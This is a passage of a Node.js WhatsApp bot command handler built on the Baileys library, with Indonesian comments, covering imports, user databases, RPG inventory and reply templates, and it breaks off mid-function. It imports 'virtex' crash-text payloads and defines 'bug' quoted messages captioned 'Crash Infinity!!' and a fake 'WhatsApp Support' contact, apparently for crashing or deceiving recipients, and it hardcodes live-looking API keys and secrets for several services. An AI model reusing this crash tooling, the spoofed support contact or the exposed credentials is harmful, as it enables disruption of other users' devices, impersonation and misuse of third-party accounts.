
"use strict";
const { 
WAMessageStubType, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia , generateWAMessage, areJidsSameUser,downloadMediaMessage, makeInMemoryStore
} = require("@adiwajshing/baileys")
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const ra = require("ra-api");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const axios = require("axios");
const hxz = require("hxz-api");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const yts = require("yt-search");
const speed = require("performance-now");
const request = require("request");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const os = require('os');
const { performance } = require('perf_hooks')
const imageToBase64 = require('image-to-base64');
const fetch = require('node-fetch');
const acrcloud = require("acrcloud");
const acr = new acrcloud({
host: "identify-eu-west-1.acrcloud.com",
access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
});
const Download = require("@phaticusthiccy/open-apis");
const { SoundCloud } = require("scdl-core");
const CuteFFMPEG = require("cute-ffmpeg").CuteFFMPEG;
const FFMPEGRequest = require("cute-ffmpeg").FFMPEGRequest;
const Ffmpeg = new CuteFFMPEG({
overwrite: true
});
const Spotify = require('spotifydl-core').default
const spotify = new Spotify({
clientId: 'acc6302297e040aeb6e4ac1fbdfd62c3',
clientSecret: '0e8439a1280a43aba9a5bc0a16f3f009'
}) 
const { sizeFormatter } = require('human-readable')
const hx = require("hxz-api")
const convert = require('imagemagick')
const gis = require('g-i-s');
const {
instagramdl, 
instagramdlv2, 
instagramdlv3, 
instagramStory,
instagramStoryv2,
youtubeSearch,
mediafiredl, 
lyricsv2, 
lyrics, 
facebookdl, 
facebookdlv2,
tiktokdl, 
tiktokdlv2, 
twitterdl, 
twitterdlv2,
getZodiac,
liputan6,
googleIt, 
wallpaperv2, 
googleImage, 
jadwalTVNow, 
gempa, 
stickerTelegram,
stickerLine,
latinToAksara,
aksaraToLatin,
asmaulhusna, asmaulhusnajson,
alquran,delay,
jadwalsholat, listJadwalSholat,
gempaNow} = require('@bochilteam/scraper')
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const { BitlyClient } = require('bitly');
const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
const stringSimilarity = require("string-similarity");
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
//================================================================================\\
const { addRegist, cekRegist } = require('../lib/register')
const antivirus  = require('../lib/antivirus.js')           
const { msgFilter, addSpam, unSpam, SpamExpired, cekSpam } = require('../lib/antispam')
const { color, bgcolor } = require('../lib/color')
const { pinterest } = require("../lib/pinterest")
const { formatp, getCase, kyun, isUrl, fetchJson, fetchText, getGroupAdmins, sleep, getBuffer, reSize} = require("../lib/myfunc");
const { parseMention, FileSize, weton, week, calender, dateIslamic, formatDate, makeid, generateMessageTag, runtime, randomNomor, jsonformat, generateProfilePicture, h2k, generateMessageID, getRandom } = require('../lib/functions')
const { TelegraPh } = require('../lib/uploader')
const { ghstalk, facebook, kodepos, moddroid, apkmody, happymod, wallpaper, wikimedia, quotesAnime, aiovideodl  } = require('../lib/scraper') 
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("../lib/blockcmd");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("../lib/banned")
const { addError,clearAllError, deleteError, checkError } = require("../lib/totalerror")
const { getDateId, clearAllUser, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("../lib/user");
const { gethitUser, checkHit, AddHit, isUserLimit, kurangLimit, getLimit, tambahLimit, addBalance, kurangBalance, getBalance, isGame, kurangGLimit, tambahGLimit, cekGLimit } = require("../lib/user");
const { Nothing,Failed,Succes,addAutoClear,autoClearChat,checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("../lib/totalcmd");
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('../lib/darah.js')
const { cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('../lib/user.js')
const { addIkan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi, kurangGajah, getIkan, getAyam, getKelinci, getDomba, getSapi, getGajah } = require('../lib/inventory.js')  
const { cekInventoryAdaAtauGak, addInventori, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion, getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('../lib/inventory.js')
const { addIkanGoreng, kurangIkanGoreng, getIkanGoreng, addAyamGoreng, kurangAyamGoreng, getAyamGoreng, addKelinciGoreng, kurangKelinciGoreng, getKelinciGoreng, addDombaGoreng, kurangDombaGoreng, getDombaGoreng, addSapiGoreng, kurangSapiGoreng, getSapiGoreng, addGajahGoreng, kurangGajahGoreng, getGajahGoreng } = require('../lib/inventory.js')  
const { cerpen } = require('../lib/cerpen')
const game = require("../lib/game");
const _sewa = require('../lib/sewa')
const _prem = require("../lib/premium");
const { addBlock, unBlock, cekBlock } = require("../lib/blockuser");
const Exif = require("../lib/exif")
const exif = new Exif()
//================================================================================\\
const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?','ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku','Naon siah kehed manggil manggil']
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)] 
const b1 = ["pukulin","kocok"]
const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["gebukin","santet"]
const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["sayang","peluk"]
const bully3 = b3[Math.floor(Math.random() * b3.length)]
const jancok = ["bugkontak","bugquoted","bugfc","bugquoted","bugkontak","bugfc","bugkontak","bugfc","bugquoted","bugfc","bugquoted","bugkontak","bugfc","bugkontak","bugquoted"]
const QotedBug = jancok[Math.floor(Math.random() * jancok.length)]
const randomcok = ['logo1','logo2','logo3']
const randomfoto = randomcok[Math.floor(Math.random() * (randomcok.length))]
const thumb = fs.readFileSync(`./media/image/${randomfoto}.jpg`)
//================================================================================\\
const register = JSON.parse(fs.readFileSync('./database/register.json'))
const AntiSpam = JSON.parse(fs.readFileSync('./database/antispam.json'));
const _inventory = JSON.parse(fs.readFileSync('./database/inventory.json'));
const DataId = JSON.parse(fs.readFileSync('./database/data.json'))
const listcmdblock = JSON.parse(fs.readFileSync('./database/blockcmd.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const listerror = JSON.parse(fs.readFileSync('./database/listerror.json'))
const setiker = JSON.parse(fs.readFileSync('./database/stick.json'))
const audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
const user = JSON.parse(fs.readFileSync('./database/user.json'))
const hitnya = JSON.parse(fs.readFileSync('./database/hitToday.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const _claim = JSON.parse(fs.readFileSync('./database/claim.json'))
const blocked = JSON.parse(fs.readFileSync('./database/userblocked.json'))
const dash = JSON.parse(fs.readFileSync('./database/dashboard.json'))
const anonChat = JSON.parse(fs.readFileSync('./database/anonymous.json'))
const allcommand = JSON.parse(fs.readFileSync('./database/allcommand.json'));
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
const spammer = []
//================================================================================\\
const { virtex1, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('../virtex/virtex.js')
const { virtex6 } = require('../virtex/virtex6.js')
const { virtex7 } = require('../virtex/virtex7.js')
const { ngazapv1 } = require('../virtex/ngazapv1') 
const { ngazapv2 } = require('../virtex/ngazapv2') 
const { ngazapv3 } = require('../virtex/ngazapv3')
//================================================================================\\
const { allmenu, fitur} = require('../message/help1')
const { spam1, spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam, khususowner, katakasar } = require("../message/stickerPack.js");
const { bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks, anime, dosa, devoloper1 } = require("../message/message.js");
const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, bot, unregister, ucaphai, toxicbro, spamnih, loplop, sangebro } = require("../message/vn")
//================================================================================\\
let tebakgambar = []; 
let family100 = []; 
let mtk = []; 
let tebaklirik = [];  
let siapaaku = [];
let tebakkata = [];
let tebakkimia = [];
let tebakbendera = [];
let tebakanime = [];
let caklontong = []
let caklontong1 = []
//================================================================================\\
module.exports = async(atak, ridho, chatUpdate, store) => {

const m = ridho
var Ownerin = `${devoloper1}@s.whatsapp.net`
var ownerNumber = `${nomerOwner}@s.whatsapp.net` || `${devoloper1}@s.whatsapp.net`
atak.readMessages([ridho.key])
 

try {

//console.log(nomerOwner)
const { type, now, fromMe } = ridho
const Id =  ridho.key.id
const antibot = ridho.isBaileys
const content = JSON.stringify(ridho.message)
const from  = ridho.key.remoteJid
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const body = (type === 'conversation') ? ridho.message.conversation : (type == 'imageMessage') ? ridho.message.imageMessage.caption : (type == 'videoMessage') ? ridho.message.videoMessage.caption : (type == 'extendedTextMessage') ? ridho.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? ridho.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? ridho.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? ridho.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (ridho.message.buttonsResponseMessage?.selectedButtonId || ridho.message.listResponseMessage?.singleSelectReply.selectedRowId ) : ''
const pes = (type === 'conversation' && ridho.message.conversation) ? ridho.message.conversation : (type == 'imageMessage') && ridho.message.imageMessage.caption ? ridho.message.imageMessage.caption : (type == 'videoMessage') && ridho.message.videoMessage.caption ? ridho.message.videoMessage.caption : (type == 'extendedTextMessage') && ridho.message.extendedTextMessage.text ? ridho.message.extendedTextMessage.text : ''
const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const messagesC = pes.slice(0).trim()


if (multi){
var prefix = /^[#+,.=''!¦|/\\©^]/.test(body) ? body.match(/^[#+,.=''!¦|/\\©^]/gi) : '.'
var thePrefix = "Multi Prefix"
}


const budy = (type === 'conversation') ? ridho.message.conversation : (type === 'extendedTextMessage') ? ridho.message.extendedTextMessage.text : ''
const selectedButton = (type == 'buttonsResponseMessage') ? ridho.message.buttonsResponseMessage.selectedButtonId : ''
const responseButton = (type == 'listResponseMessage') ? ridho.message.listResponseMessage.title : ''                        
//const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const q = args.join(' ')
const c = args.join(" ")
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
const botNumber = atak.user.id ? atak.user.id.split(":")[0]+"@s.whatsapp.net" : atak.user.id
const isGroup = from.endsWith('@g.us')
const sender = isGroup ? (ridho.key.participant ? ridho.key.participant : ridho.participant) : ridho.key.remoteJid
const senderNumber = sender.split("@")[0] 
const isOwner = ownerNumber.includes(sender) || checkDataId ("owner", sender, DataId) 
const command =  body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const theOwner = sender == Ownerin
const totalchat = await store.chats.all().map(v => v.id)
const totalGroup = totalchat.filter(v => v.endsWith('g.us'))
const groupMetadata = isGroup ? await atak.groupMetadata(from) : ""
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
//const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const pushname = ridho.pushName || "No Name"
const forward = {forwardingScore: 10, isForwarded: true, sendEphemeral: true}
const text = args.join(" ")
const timestampp = speed();
const latensi = speed() - timestampp
const arg = budy.slice(command.length + 2, budy.length)
const itsMe = sender == botNumber ? true : false
const mentionByTag = type == "extendedTextMessage" && ridho.message.extendedTextMessage.contextInfo != null ? ridho.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && ridho.message.extendedTextMessage.contextInfo != null ? ridho.message.extendedTextMessage.contextInfo.participant || "" : ""
const quoted = ridho.quoted ? ridho.quoted : ridho
const mime = (quoted.msg || quoted).mimetype || ''
const users = mentionByReply? mentionByReply : mentionByTag[0]
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []
const isHit = checkHit(senderNumber)   
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
const delay = time => new Promise(res => setTimeout(res, time))
const isLimit = kurangLimit(senderNumber, 1)
//================================================================================\\
const userLevel = getLevelingLevel(senderNumber)
const userExp = getLevelingXp(senderNumber)
const userId = getLevelingId(senderNumber)
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = getDateId(senderNumber) 
//================================================================================\\
const DarahAwal = rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(senderNumber)   
const isCekDarah = getDarah(senderNumber)
const isUmpan = getUmpan(senderNumber)
const isPotion = getPotion(senderNumber)
const isIkan = getIkan(senderNumber)
const isAyam = getAyam(senderNumber)
const iskelinci = getKelinci(senderNumber)
const isDomba = getDomba(senderNumber)
const isSapi = getSapi(senderNumber)
const isGajah = getGajah(senderNumber)
const isMonay = getMonay(senderNumber)
const isBesi = getBesi(senderNumber) 
const isEmas = getEmas(senderNumber)
const isEmerald = getEmerald(senderNumber)
const isInventory = cekInventoryAdaAtauGak(senderNumber)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(senderNumber)
const ikan = ['🐟','🐠','🐡']
//================================================================================\\
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupOwner = isGroup ? groupOwner == sender : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAntiLink = checkDataId ("antilink", from, DataId) 
const isKickarea = checkDataId ("antiasing", from, DataId) 
const isAntilinkGc = checkDataId ("antilinkgc", from, DataId) 
const isBanchat = checkDataId ("banchat", from, DataId) 
const isAntiVirtex = checkDataId ("antivirtex", from, DataId)
const isAntihidetag = checkDataId ("antihidetag", from, DataId) 
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium) || ridho.key.fromMe
const gcount = isPremium ? gcounti.prem : gcounti.user
const isRegist = cekRegist(senderNumber)
//================================================================================\\
require("../message/mess.js")(senderNumber, prefix, getLimit, cekGLimit, gcount, command)
//================================================================================\\

const iyakak = bot[Math.floor(Math.random() * bot.length)]              
const ucapbot = fs.readFileSync(iyakak)

//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//Vn saat ada yang sange
const lusange = sangebro[Math.floor(Math.random() * sangebro.length)]              
const sangeya = fs.readFileSync(lusange)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu) 

const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         

//================================================================================\\
if (isCmd){
atak.sendPresenceUpdate('composing', from)
} else {
atak.sendPresenceUpdate('available', from)
}
//================================================================================\\
// image Pake Pp Org
try {
var ppimg = await atak.profilePictureUrl(sender, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
const ofrply = await getBuffer(ppimg)
const dfrply = await reSize(ppimg, 300, 300)
//================================================================================\\
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'}      
//================================================================================\\
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": ofrply},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${pushname}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': ofrply}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${botName}`,"title": `Hmm`,'jpegThumbnail': ofrply}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 200, status: 1,surface : 2,message: `${botName}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: ofrply, sellerJid: `0@s.whatsapp.net`}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${botName}`,'jpegThumbnail': ofrply}}}
const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": botName, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": ofrply, "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: { title: 'Halo bang', jpegThumbnail: ofrply}}}
const fvid = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '30', 'caption': 'Halo bang','jpegThumbnail': ofrply}}}
const fgc = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": "Halo bang jagoo", 'jpegThumbnail': ofrply}}}
const fgif = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: {  "videoMessage": {  "title":"Lol Lexxy+", "h": `Hmm`, 'seconds': "30",  'gifPlayback': 'true',  'caption': 'Lol Lexxy+', 'jpegThumbnail': ofrply}}} 
const fvn = {key: { fromMe: false,participant: `62882000383955@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "30","ptt": "true"}}}
//================================================================================\\
const bugquoted = { key: { fromMe: true, participant: `6285870017326@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Crash Infinity!!`, "jpegThumbnail": ofrply}}}
const bugkontak = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6288226703423:+62 882-2670-3423\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const bugfc = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Kok Fc Bang`, "jpegThumbnail": ofrply}}}
//================================================================================\\
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "floc"){
var setQuoted = floc
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "fdoc"){
var setQuoted = fdoc
} else if(Qoted === "fvid"){
var setQuoted = fvid
} else if(Qoted === "fgc"){
var setQuoted = fgc
} else if(Qoted === "fgif"){
var setQuoted = fgif
} else if(Qoted === "fvn"){
var setQuoted = fvn
} else if(Qoted === "ridho"){
var setQuoted = ridho
}
//================================================================================\\
if(QotedBug === "bugquoted"){
var setQuotedBug = bugquoted
} else if(QotedBug === "bugkontak"){
var setQuotedBug = bugkontak
} else if(QotedBug === "bugfc"){
var setQuotedBug = bugfc
}
//================================================================================\\
const setReply = async(teks) =>{ 
if(orquoted === true && replyType === "web1"){
atak.sendMessage(from, { contextInfo: { externalAdReply:{ showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${textreply}` }}, text: teks}, {quoted: setQuoted})
} else if(orquoted === false && replyType === "web1"){
atak.sendMessageV2(from, { contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${textreply}` }}, text: teks},{quoted: setQuoted})
} else if(orquoted === true && replyType === "web2"){
atak.sendMessage(from, { contextInfo: { forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply:{title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${textreply}` }}, text: teks}, { quoted: setQuoted })
} else if(orquoted === false && replyType === "web2"){
atak.sendMessageV2(from, { contextInfo: { forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply:{title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${textreply}` }}, text: teks}, { quoted: setQuoted })
} else if(orquoted === true && replyType === "web3"){
atak.sendMessage(from, { contextInfo: { forwardingScore: 10, isForwarded: true, externalAdReply:{showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${textreply}` }}, text: teks}, { quoted: setQuoted })
} else if(orquoted === false && replyType === "web3"){
atak.sendMessageV2(from, { contextInfo: { forwardingScore: 10, isForwarded: true, externalAdReply:{showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${textreply}` }}, text: teks}, { quoted: setQuoted })
} else if(orquoted === true && replyType === "mess"){
atak.sendMessage(from, {text: teks}, { quoted: setQuoted })
} else if(orquoted === false && replyType === "mess"){
atak.sendMessageV2(from, {text: teks}) 
} else if(replyType === "troli"){
let template = await generateWAMessageFromContent(from, {
'orderMessage': {
'orderId': '62887435047326@s.whatsapp.net',
'thumbnail': fs.readFileSync('./media/image/reply.jpg'),
'itemCount': "2022",
'title': "title",
'description': "description",
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': botName
}
}, {
'quoted': ridho
});
 atak.relayMessage(from, template.message,{ messageId: template.key.id })                   
} else if(replyType == "troli2"){
let template = await generateWAMessageFromContent(from, {
listMessage:  {
sections: [],
title: botName,
description: teks,
buttonText: '',
listType: 2,
productListInfo:  {
productSections: [
 {
 products: [
 { productId: '9999999999999999' },
 { productId: '6431678466857362' },
 { productId: '4392524570816732' },
 ],
title: 'junior'
}
],
headerImage:  {
productId: '4120139628109348',
jpegThumbnail: thumb
},
businessOwnerJid: '62887435047326@s.whatsapp.net'
}
}            
}, {
'quoted': ridho
});
 atak.relayMessage(from, template.message,{ messageId: template.key.id })                   
} else {
atak.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}
//================================================================================\\
const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	
const buttonMessage = {
contextInfo: options,
document: fs.readFileSync('./media/document/file.docx'),
mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
title : "Footer text", 
fileLength : 999999999999, 
pageCount: 100, 
fileName : botName, 
caption: text1,
footer: desc1,
buttons: but,
headerType: "DOCUMENT"
}

await atak.sendMessage(id, buttonMessage,options)
} 
//================================================================================\\
if (!publik && !itsMe && !isOwner && !theOwner) return
 

// Bot Status
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
 })
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
//================================================================================\\
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reply = (teks) => {
atak.sendMessage(from, { text: teks }, { quoted: ridho })
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  atak.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  atak.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: ridho})
}
const sendMess = (hehe, teks) => {
atak.sendMessage(hehe, { text, teks })
}
const buttonWithText = (from, text, footer, buttons) => {
return atak.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendGif = (teks, teksnya) => {
